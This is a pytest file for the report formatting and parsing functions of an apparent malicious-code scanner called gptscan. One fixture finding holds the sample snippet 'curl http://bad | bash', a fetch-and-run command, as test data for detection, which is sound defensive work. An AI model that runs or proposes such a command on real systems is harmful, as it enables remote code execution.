import os
import pytest
import gptscan


def test_generate_compact_basic():
    results = [
        {
            "path": "src/app.py",
            "line": 42,
            "own_conf": "85%",
            "gpt_conf": "90%",
            "admin_desc": "Admin description",
            "end-user_desc": "Suspicious execution detected",
            "snippet": "os.system(cmd)"
        },
        {
            "path": "scripts/setup.sh",
            "line": 1,
            "own_conf": "75%",
            "gpt_conf": "",
            "admin_desc": "Dangerous curl pipe bash",
            "end-user_desc": "",
            "snippet": "curl http://bad | bash"
        }
    ]
    output = gptscan.generate_compact(results)
    lines = output.splitlines()
    assert len(lines) == 2
    assert lines[0] == "src/app.py:42: [90%] Suspicious execution detected"
    assert lines[1] == "scripts/setup.sh:1: [75%] Dangerous curl pipe bash"


def test_parse_compact_content():
    compact_str = (
        "src/main.py:10: [80%] High risk code\n"
        "lib/util.js:5: [50%] Medium risk function\n"
        "test/demo.py:1: Clean file\n"
    )
    parsed = gptscan.parse_compact_content(compact_str)
    assert len(parsed) == 3
    assert parsed[0]["path"] == "src/main.py"
    assert parsed[0]["line"] == 10
    assert parsed[0]["own_conf"] == "80%"
    assert parsed[0]["end-user_desc"] == "High risk code"

    assert parsed[1]["path"] == "lib/util.js"
    assert parsed[1]["line"] == 5
    assert parsed[1]["own_conf"] == "50%"

    assert parsed[2]["path"] == "test/demo.py"
    assert parsed[2]["line"] == 1
    assert parsed[2]["own_conf"] == "0%"


def test_parse_report_content_compact_autodetect():
    compact_content = "path/to/script.py:15: [95%] Malicious payload"
    parsed = gptscan.parse_report_content(compact_content, filename_hint="report.txt")
    assert len(parsed) == 1
    assert parsed[0]["path"] == "path/to/script.py"
    assert str(parsed[0]["line"]) == "15"
    assert parsed[0]["own_conf"] == "95%"


def test_export_results_to_file_compact(tmp_path):
    results = [
        {"path": "foo.py", "line": 2, "own_conf": "60%", "end-user_desc": "Test finding"}
    ]
    out_file = tmp_path / "report.txt"
    gptscan.export_results_to_file(str(out_file), results, output_format="compact")
    content = out_file.read_text(encoding="utf-8")
    assert "foo.py:2: [60%] Test finding" in content
